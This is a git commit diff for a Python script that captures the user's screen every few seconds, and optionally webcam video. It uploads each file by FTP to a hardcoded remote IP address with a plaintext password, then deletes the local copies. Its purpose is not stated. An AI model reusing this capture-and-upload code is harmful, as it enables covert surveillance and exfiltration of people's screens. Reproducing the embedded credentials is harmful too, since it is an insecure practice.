920a74b60e82c1a454a4c61e737c2519c2955d69
Elwin <abc602456615@163.com>
2020-08-27 20:19:20 +0100

    Reorder

--- main.py
+++ main.py
@@ -14,20 +14,19 @@ Not allowed for commercial use.
 @ Lou - Tang
 '''
 
-directory_name = './tmp/'
-file_name = f'{time.time()}'
-fu_fi_name = f'{directory_name}{file_name}'
-print(fu_fi_name)
-
-write_ok = True
-
 
 def clear_tmp():
+    global session
     shutil.rmtree(directory_name)
+    session.close()
+
+
+def start_session(ip, user, pwd):
+    return ftplib.FTP(ip, user, pwd)
 
 
 def time_alert(sec):
-    time.sleep(10)
+    time.sleep(sec)
     global write_ok
     write_ok = False
     print('times up')
@@ -35,18 +34,20 @@ def time_alert(sec):
 
 # Construct file path
 def init():
+    global session
     Path(directory_name).mkdir(parents=True, exist_ok=True)
+    ip = '118.89.221.185'
+    user = 'uploader'
+    pwd = 'qwerQWER123'
+    return start_session(ip, user, pwd)
 
 
 # Upload video
 def upload(filename):
-    ip = '118.89.221.185'
-    user = 'uploader'
-    pwd = 'qwerQWER123'
-    session = ftplib.FTP(ip, user, pwd)
+    global session
     with open(f'{directory_name}{filename}', 'rb') as file:
+        print(filename)
         session.storbinary(f'STOR {filename}', file)
-    session.close()
 
 
 # Clear and release mem
@@ -54,7 +55,6 @@ def clear_file(cap, out):
     cap.release()
     out.release()
     cv2.destroyAllWindows()
-    upload(f'{file_name}.mp4')
 
 
 # Show frame for users
@@ -71,18 +71,22 @@ def capture_face():
     fourcc = cv2.VideoWriter_fourcc('m', 'p', '4', 'v')
 
     vout = cv2.VideoWriter()
-    vout.open(f'{fu_fi_name}.mp4', fourcc, fps, sz, True)
+    file_name = f'{time.time()}'
+    vout.open(f'{directory_name}{file_name}.mp4', fourcc, fps, sz, True)
 
     while write_ok:
         ret, frame = cap.read()
         vout.write(frame)
 
     clear_file(cap, vout)
+    upload(f'{file_name}.mp4')
 
 
 def capture_screen():
+    global directory_name
     myScreenshot = pyautogui.screenshot()
-    myScreenshot.save(f'{fu_fi_name}.png')
+    file_name = f'{time.time()}'
+    myScreenshot.save(f'{directory_name}{file_name}.png')
     upload(f'{file_name}.png')
 
 
@@ -91,25 +95,29 @@ def loop_capture():
     # Upload 10 photos
     while cont < 10:
         capture_screen()
-        time.sleep(20)
+        time.sleep(5)
         cont += 1
 
 
+write_ok = True
+
+directory_name = './tmp/'
+
 # Initialising
-init()
+session = init()
+
 t = threading.Thread(target=time_alert, args=(5,))
 t1 = threading.Thread(target=loop_capture)
-t2 = threading.Thread(target=capture_face)
+# t2 = threading.Thread(target=capture_face)
 
-t2.start()
+# t2.start()
 t1.start()
 t.start()
 
 # Ends all running threads
-t2.join()
+# t2.join()
 t1.join()
 t.join()
 
 # Delete tmp file
 clear_tmp()
-
